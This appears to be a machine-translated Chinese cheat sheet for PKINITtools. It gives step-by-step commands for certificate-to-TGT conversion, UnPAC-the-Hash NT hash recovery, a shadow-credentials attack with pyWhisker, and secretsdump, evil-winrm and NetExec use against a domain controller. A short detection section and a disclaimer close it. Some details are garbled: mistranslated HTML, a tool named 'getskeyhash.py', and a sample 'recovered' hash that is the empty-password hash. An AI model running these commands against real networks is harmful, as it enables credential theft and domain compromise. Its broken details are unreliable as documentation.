<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎫 PKINITtools - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
  ██████╗ ██╗  ██╗██╗███╗   ██╗██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔══██╗██║ ██╔╝██║████╗  ██║██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██████╔╝█████╔╝ ██║██╔██╗ ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██╔═══╝ ██╔═██╗ ██║██║╚██╗██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ██║     ██║  ██╗██║██║ ╚████║██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
       Kerberos PKINIT Authentication, Shadow Credentials & UnPAC-the-Hash Toolkit
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/PKINITtools-Kerberos_PKINIT-blue?style=for-the-badge" alt="PKINITtools">
  <img src="https://img.shields.io/badge/Author-Dirk--jan_Mollema-orange?style=for-the-badge" alt="dirkjanm">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-MIT-red?style=for-the-badge" alt="许可证 MIT">
</p>

<p对齐=“中心”>
  <b>🌐 用于初始身份验证 (PKINIT) 的 Kerberos 公钥加密工具，将证书转换为 TGT 票证并恢复 NT 哈希</b>
</p>

---

## 📋 目录

- [概述和 PKINIT 架构](#-overview--the-pkinit-architecture)
- [主要实用程序：`gettgtpkinit.py` 和 `getskeyhash.py`](#-key-utilities-gettgtpkinitpy--getskeyhashpy)
- [安装](#-安装)
- [将 AD CS 证书转换为 Kerberos TGT](#-converting-ad-cs-certificates-to-kerberos-tgt)
  - [使用 PFX 文件](#using-a-pfx-file)
  - [使用 Base64 编码的 PFX（中继链）](#using-base64-encoded-pfx-relay-chains)
- [恢复 NT 哈希 (UnPAC-the-Hash)](#-recovering-nt-hashes-unpac-the-hash)
- [影子凭证攻击工作流程](#-shadow-credentials-attack-workflow)
- [使用 Impacket 和 NetExec 使用 TGT](#-consuming-the-tgt-with-impacket--netexec)
- [快速参考表](#-quick-reference-table)
- [防守考虑与检测](#-defective-considerations--detection)
- [法律免责声明](#-legal-disclaimer)

---

## 🎯 概述和 PKINIT 架构

**PKINIT**（Kerberos 中初始身份验证的公钥加密，在 **RFC 4556** 中定义）是 Kerberos 协议的扩展。 PKINIT 允许客户端使用 **X.509 数字证书和私钥/公钥对** 来证明身份，而不需要用户的秘密密码哈希（NTLM 或 AES）来请求 Kerberos 票证授予票证 (TGT)。

**PKINITtools** 由著名的 Active Directory 研究人员 **Dirk-jan Mollema (@_dirkjan)** 创建，提供了基本的 Python 原语：
1. 使用提取或中继的数字证书通过 PKINIT 对 Active Directory 域控制器进行身份验证。
2. 获取标准 Kerberos TGT 文件 (`.ccache`)。
3.通过**UnPAC-the-Hash**机制恢复账户的明文**NTLM Hash**。

---

## 🧰 主要实用程序：`gettgtpkinit.py` 和 `getskeyhash.py`

- **`gettgtpkinit.py`**：通过端口 88 与 KDC（Kerberos 密钥分发中心）通信，提供证书，并请求装甲 TGT，并将其保存为 Kirbi 或 ccache 文件。
- **`getskeyhash.py`**：询问 PKINIT 票证中返回的 Kerberos PAC（特权属性证书），以计算并公开帐户的静态 NT 哈希值。

---

## 📥 安装
```bash
# Clone GitHub repository
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools

# Install dependencies (requires impacket, cryptography, minikerberos)
pip3 install -r requirements.txt
pip3 install .
```
---

## 🎫 将 AD CS 证书转换为 Kerberos TGT

当您通过 Certipy、Coercer 或 NTLM Relay 获取 Active Directory 证书时：

### 使用 PFX 文件
```bash
# Request TGT using a client certificate file (.pfx)
gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass 'CertPass123' corp.local/administrator admin.ccache
```
### 使用 Base64 编码的 PFX（中继链）

通常，`ntlmrelayx` 在 AD CS ESC8 攻击期间将证书打印为原始 base64 字符串：
```bash
# Convert base64 certificate directly into a Kerberos TGT for Domain Controller (DC01$)
gettgtpkinit.py -pfx-base64 "MIIKggIBAzCCCXwGCSqGSIb3DQEHA..." corp.local/DC01\$ dc01.ccache
```
---

## 🔑 恢复 NT 哈希 (UnPAC-the-Hash)

当帐户使用 PKINIT 进行身份验证时，域控制器使用 PAC_CREDENTIAL_INFO 结构对 PAC 进行签名，该结构包含帐户的静态 **NTLM 哈希**（使用临时 AS-REP 密钥加密）。 `getskeyhash.py` 解密该结构：
```bash
# Extract the NTLM hash directly from the ticket and KDC
getskeyhash.py -hashes :7fc508... corp.local/administrator admin.ccache

# Output format:
# [*] Found PAC DATA
# [*] Decrypted PAC_CREDENTIAL_INFO
# [!] Recovered NT Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```
有了NT哈希在手，你就可以立即执行**Pass-the-Hash**或离线破解！

---

## 👥 影子凭证攻击工作流程

当您对 Active Directory 对象（`GenericAll`、`GenericWrite`、`WriteProperty` 通过 `msDS-KeyCredentialLink`）具有写访问权限时：
```bash
# 1. Use pyWhisker to inject a newly generated key credential into the victim object
pywhisker.py -d "corp.local" -u "lowuser" -p "Password123" --target "TargetUser" --action "add" --export "targetuser.pfx"

# 2. Use PKINITtools to authenticate with the forged certificate
gettgtpkinit.py -cert-pfx targetuser.pfx -pfx-pass "pywhisker" corp.local/TargetUser target.ccache

# 3. Extract TargetUser's NT Hash
getskeyhash.py corp.local/TargetUser target.ccache
```
---

## 🚀 通过 Impacket 和 NetExec 使用 TGT

`gettgtpkinit.py` 输出 `.ccache` 票证后，将其导出到环境中：
```bash
# Set Kerberos credential cache environment variable
export KRB5CCNAME=/path/to/admin.ccache

# Dump domain secrets via Impacket without passwords!
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local

# Connect via Evil-WinRM using Kerberos ticket
evil-winrm -i dc01.corp.local -r corp.local

# Execute commands using NetExec with Kerberos auth
nxc smb dc01.corp.local -k --no-pass -x "whoami /priv"
```
---

## ⚡ 快速参考表

|目标|命令 |
|------------|---------|
| **通过 PFX 文件进行 TGT** | `gettgtpkinit.py -cert-pfx <FILE.pfx> <DOMAIN>/<USER> <OUT.ccache>` |
| **通过 Base64 证书进行 TGT** | `gettgtpkinit.py -pfx-base64 "<BASE64>" <DOMAIN>/<USER> <OUT.ccache>` |
| **指定域控制器**| `gettgtpkinit.py -dc-ip <DC_IP> -cert-pfx <CERT> <DOMAIN>/<USER> <TGT>` |
| **UnPAC-the-Hash（获取 NTLM）**| `getskeyhash.py <DOMAIN>/<USER> <TGT.ccache>` |
| **将 TGT 传递给 Impacket** | `export KRB5CCNAME=<TGT.ccache>; impacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC>` |
| **将 TGT 传递给 NetExec** | `export KRB5CCNAME=<TGT.ccache>; nxc smb <DC> -k --no-pass` |

---

## 🛡️ 防守考虑和检测

1. **事件 ID 4768（TGT 请求）：** Active Directory 记录 Kerberos TGT 请求。使用 PKINIT 时，**预身份验证类型**字段显示 `16` (PKINIT)，而不是 `2` (PA-ENC-TIMESTAMP)。
2. **审核 `msDS-KeyCredentialLink` 修改：** 事件 ID 5136 记录目录对象修改。当关键凭据附加到非 Azure/Intune 托管帐户时发出警报。

---

## ⚠️ 法律免责声明

> [!警告]
> PKINITtools 仅适用于授权的 Active Directory 安全审核、红队操作和教育研究。未经明确许可操纵公司 Kerberos 票证是非法的。